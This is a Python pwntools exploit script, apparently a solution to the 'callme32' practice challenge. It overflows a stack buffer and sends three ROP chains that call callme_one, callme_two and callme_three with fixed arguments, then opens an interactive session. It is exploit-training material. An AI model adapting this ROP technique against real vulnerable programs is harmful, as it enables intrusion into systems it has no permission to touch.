#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme32')
libc=ELF('libcallme32.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x80484b0
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
offset=cyclic_find(0x6161616c)
pad=cyclic(offset)
eip=p32(0x41414141)
rop1= ROP(exe)
rop1.call('callme_one',[0xdeadbeef,0xcafebabe,0xd00df00d])
rop1.call('main')
rop2= ROP(exe)
rop2.call('callme_two',[0xdeadbeef,0xcafebabe,0xd00df00d])
rop2.call('main')
rop3= ROP(exe)
rop3.call('callme_three',[0xdeadbeef,0xcafebabe,0xd00df00d])
log.info("First Chain:"+rop1.dump())
log.info("Second Chain:"+rop2.dump())
log.info("Third Chain:"+rop3.dump())

payload=(
    pad+rop1.chain()
)
io = start()
print(io.recvline())
io.sendline(payload)

payload=(
    pad+rop2.chain()
)
io.sendline(payload)

payload=(
    pad+rop3.chain()
)

io.sendline(payload)

io.interactive()

